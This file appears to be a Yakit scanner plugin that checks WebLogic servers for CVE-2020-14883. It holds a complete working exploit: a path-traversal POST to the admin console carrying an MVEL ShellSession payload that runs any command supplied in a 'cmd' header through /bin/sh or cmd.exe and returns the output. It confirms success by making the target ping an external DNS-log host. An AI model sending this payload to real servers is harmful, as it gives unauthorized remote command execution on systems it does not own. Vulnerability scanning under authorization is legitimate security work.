# port scan plugin
yakit.AutoInitYakit()
log.setLevel("info")

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    server, token, err = risk.NewDNSLogDomain()
    cmd = str.f("ping -c 1 %v.dnstunnel.run", token)

    packet = `
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: {{params(target)}}
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 1243
Content-Type: application/x-www-form-urlencoded
Cookie: ADMINCONSOLESESSION=agutTyNauTumRq96IZytvqZItXRNfyeRyb-OzdIaM4seaggXFxby!-1359209934
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
cmd: {{params(cmd)}}

_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread = (weblogic.work.ExecuteThread) Thread.currentThread();
weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
field.setAccessible(true);
Object obj = field.get(adapter);
weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
String cmd = req.getHeader("cmd");
String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
if (cmd != null) {
    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
    weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl) req.getClass().getMethod("getResponse").invoke(req);
    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
    res.getServletOutputStream().flush();
    res.getWriter().write("");
}executeThread.interrupt();
");`
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"cmd":cmd}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    
    sleep(5)
    dnsdata, dnserr = risk.CheckDNSLogByToken(token)
    if dnserr != nil {
        cmd = str.f("ping -n 1 %v.dnstunnel.run", token)
        rsp,req,_ = poc.HTTP(packet, 
        poc.params({"target":addr,"cmd":cmd}),
        poc.https(isTls),
        poc.redirectTimes(0),
        )
        sleep(5)
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
    }

    if len(rsp) > 0 {
        if dnsdata != nil {
            yakit.Info("%v Weblogic Console HTTP 协议远程代码执行漏洞CVE-2020-14883漏洞", addr)
            risk.NewRisk(
                addr,risk.title("Weblogic Console HTTP 协议远程代码执行漏洞CVE-2020-14883漏洞"),
                risk.severity("high"),
                risk.titleVerbose("Weblogic Console HTTP 协议远程代码执行漏洞CVE-2020-14883漏洞存在"),
                risk.type("未授权访问[Weblogic]"),
                risk.payload(cmd),
            )
        }
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    // dump(result.GetServiceName())
    // println("-------------------------------")
    // dump(result.GetCPEs())
    // println("-------------------------------")
    // dump(result.GetDomains())
    // println("-------------------------------")
    // dump(result.GetHtmlTitle())
    // println("-------------------------------")
    // dump(result.GetProto())

    if len(result.Fingerprint.HttpFlows)>0{
        if str.MatchAllOfSubString(result.GetServiceName(), "weblogic") {
            handleCheck(result.Target,result.Port)
        }
    }
    
}
